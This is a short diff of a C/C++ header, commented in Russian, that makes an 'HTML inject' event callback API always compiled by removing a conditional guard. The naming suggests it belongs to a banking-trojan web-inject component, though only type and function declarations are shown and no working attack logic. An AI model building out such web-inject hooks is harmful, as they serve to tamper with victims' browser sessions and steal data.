@@ -173,15 +173,14 @@ public:
 //		событий HTML инжекта
 //*********************************************************
 // Метод, событие HTML инжекта
-#ifdef BV_APP
-	enum THTMLInjectEventID {injCustom, injMaskFinded, injDataHandled};
-	typedef void(*THTMLInjectEvent)(LPVOID Data,        	// Данныве с которыми зарегистрировано событие
-									LPVOID Sender, 	    	// источник события
-									THTMLInjectEventID ID,  // Идентификатор события
-									LPVOID Reserver);      	// Зарезервировано
+enum THTMLInjectEventID {injCustom, injMaskFinded, injDataHandled};
+typedef void(*THTMLInjectEvent)(LPVOID Data,        	// Данныве с которыми зарегистрировано событие
+								LPVOID Sender, 	    	// источник события
+								THTMLInjectEventID ID,  // Идентификатор события
+								LPVOID Reserver);      	// Зарезервировано
 
-	void SetHTMLInjectEvent(LPVOID Data, THTMLInjectEvent Event);
-#endif
+void SetHTMLInjectEvent(LPVOID Data, THTMLInjectEvent Event);
+
 
 
 //*****************************************************************
